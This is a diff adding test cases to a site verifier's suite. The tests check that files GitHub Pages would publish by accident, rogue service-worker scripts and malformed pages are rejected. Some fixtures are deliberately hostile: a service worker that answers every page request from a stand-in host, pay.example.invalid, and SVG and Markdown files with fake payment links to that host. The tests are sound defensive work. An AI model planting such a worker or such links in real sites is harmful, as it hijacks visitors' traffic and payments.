@@ -1802,3 +1802,53 @@ for (const [control, path, content] of [
     assert.equal(result.code, 0, `${control} was rejected: ${result.stderr}`);
   });
 }
+
+// Found by the review of the served-file check: what Jekyll publishes under a
+// dot name, what a script can become, and what a page without a doctype loads.
+for (const [defect, path, content, message] of [
+  // Jekyll's default include, ".htaccess", is a prefix match on any name.
+  ["an SVG published under a .htaccess name", ".htaccess.svg",
+    `${SVG_OPEN}<a href="https://pay.example.invalid/x"><text y="9">Pay</text></a></svg>\n`,
+    /\.htaccess\.svg is published by GitHub Pages: Jekyll's default include, "\.htaccess", matches any name/],
+  ["a note in a directory published under a .htaccess name", "assets/.htaccess-shop/pay.md",
+    "[Pay](https://pay.example.invalid/x)\n",
+    /assets\/\.htaccess-shop(\/pay\.md)? is published by GitHub Pages: Jekyll's default include/],
+  // Registered from an inline script, a worker at the root controls every page.
+  ["a script where a service worker would control the storefront", "sw.mjs",
+    'self.addEventListener("fetch", (event) => event.respondWith(fetch("https://pay.example.invalid/x")));\n',
+    /sw\.mjs is a script in a directory at or above claude-code-theme-install-guide\.html\. Registered as a service worker/],
+  ["a script beside a page in a subdirectory", "assets/sw.mjs", "self.skipWaiting();\n",
+    /assets\/sw\.mjs is a script in a directory at or above assets\/social-preview\.html/],
+  ["a page in quirks mode", "assets/plain.html", '<title>Plain</title><link rel="stylesheet" href="../llms.txt">\n',
+    /assets\/plain\.html must open with <!doctype html>/],
+  ["an SVG with no namespace", "assets/plain.svg", '<svg viewBox="0 0 9 9"><rect width="9" height="9"/></svg>\n',
+    /assets\/plain\.svg must open with <svg xmlns="http:\/\/www\.w3\.org\/2000\/svg">/],
+  ["a sitemap with no namespace", "sitemap.xml",
+    '<?xml version="1.0" encoding="UTF-8"?>\n<urlset>\n  <url><loc>https://gabs-utilities.com/</loc></url>\n</urlset>\n',
+    /sitemap\.xml must open with <urlset xmlns="http:\/\/www\.sitemaps\.org\/schemas\/sitemap\/0\.9">/],
+]) {
+  test(`rejects ${defect}`, { timeout: 90_000 }, async (t) => {
+    const fixtureRoot = await addFile(t, path, content);
+
+    const result = await runVerifier(fixtureRoot);
+
+    assert.notEqual(result.code, 0, `${defect} shipped green`);
+    assert.match(result.stderr, message);
+  });
+}
+
+for (const [control, path, content] of [
+  // Jekyll never enters .github, so the include prefix does not reach this.
+  ["a .htaccess name inside a directory Pages does not serve", ".github/.htaccess.svg",
+    `${SVG_OPEN}<a href="https://pay.example.invalid/x"><text y="9">Pay</text></a></svg>\n`],
+  // A worker's scope is its own directory, and scripts/ holds no page.
+  ["a script in a directory that holds no page", "scripts/sw.mjs", "self.skipWaiting();\n"],
+]) {
+  test(`accepts ${control}`, { timeout: 90_000 }, async (t) => {
+    const fixtureRoot = await addFile(t, path, content);
+
+    const result = await runVerifier(fixtureRoot);
+
+    assert.equal(result.code, 0, `${control} was rejected: ${result.stderr}`);
+  });
+}
